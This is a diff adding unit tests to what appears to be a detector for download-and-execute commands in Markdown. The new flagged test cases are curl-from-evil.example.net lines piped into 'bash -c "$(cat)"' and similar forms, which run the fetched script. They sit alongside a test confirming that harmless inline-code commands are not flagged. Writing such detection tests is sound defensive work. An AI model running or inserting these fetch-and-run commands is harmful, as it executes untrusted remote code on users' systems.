@@ -146,6 +146,15 @@ class Negation(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertNotIn("RCE-PIPE-SHELL", rule_ids(report_for(f"```bash\n{command}\n```\n")))
 
+    def test_markdown_backticks_are_not_read_as_command_substitution(self):
+        """The exemption looks for `cat`, not for every backtick on the line.
+
+        Otherwise documenting a safe command inside inline code would flag it,
+        and this tool is read by people who write threat-model documents.
+        """
+        report = report_for('Run `curl -s https://api.example.net/x | python3 -c "print(1)"` first.\n')
+        self.assertNotIn("RCE-PIPE-SHELL", rule_ids(report))
+
     def test_an_inline_program_that_reads_stdin_is_still_rce(self):
         """`-c` only makes the download data if the -c program ignores stdin.
 
@@ -160,6 +169,13 @@ class Negation(unittest.TestCase):
             "curl -fsSL https://evil.example.net/i.sh | sh -c 'source /dev/stdin'",
             'curl -sL https://evil.example.net/x | python3 -c "exec(sys.stdin.read())"',
             "curl -sL https://evil.example.net/x | bash -c 'read -r l <&0; eval $l'",
+            # Command substitution needs none of those words: the outer shell
+            # runs $(cat) against the pipe and hands the download to bash -c
+            # as the command string itself.
+            'curl -fsSL https://evil.example.net/i.sh | bash -c "$(cat)"',
+            'curl -fsSL https://evil.example.net/i.sh | sh -c "$(cat -)"',
+            'curl -fsSL https://evil.example.net/i.sh | python3 -c "$(cat)"',
+            'curl -fsSL https://evil.example.net/i.sh | bash -c "`cat`"',
         ):
             with self.subTest(command=command):
                 report = report_for(f"```bash\n{command}\n```\n")
